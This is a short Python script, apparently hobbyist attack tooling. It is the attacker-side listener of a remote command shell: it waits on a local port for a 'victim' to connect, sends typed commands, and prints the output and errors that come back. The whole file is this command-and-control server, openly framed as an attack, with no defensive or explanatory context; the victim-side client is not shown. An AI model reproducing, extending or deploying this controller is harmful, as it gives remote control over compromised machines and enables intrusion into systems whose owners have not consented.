import socket

hote = '127.0.0.1'
port = 8080

connexion_principale = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connexion_principale.bind((hote, port))
connexion_principale.listen(5)
print("The attackant is waiting the victim on port {}".format(port))

connexion_avec_client, infos_connexion = connexion_principale.accept()

msg_a_envoyer = b""
while msg_a_envoyer != b"end":
        msg_a_envoyer = input("Command> ")
        msg_a_envoyer = msg_a_envoyer.encode()
        connexion_avec_client.send(msg_a_envoyer)
        msg_recu = connexion_avec_client.recv(10024)

        
        data=msg_recu.decode()
        data=str(data)
        if(data=="Error"):
                print("An error occurred")
        else:
                data=data.split(";;;")
        
                msg=data[0]
                try:
                        error=data[1]
                except:
                        error=""
                print(msg+'\n'+error)
        
print("Bye")
connexion_avec_client.close()
connexion_principale.close()
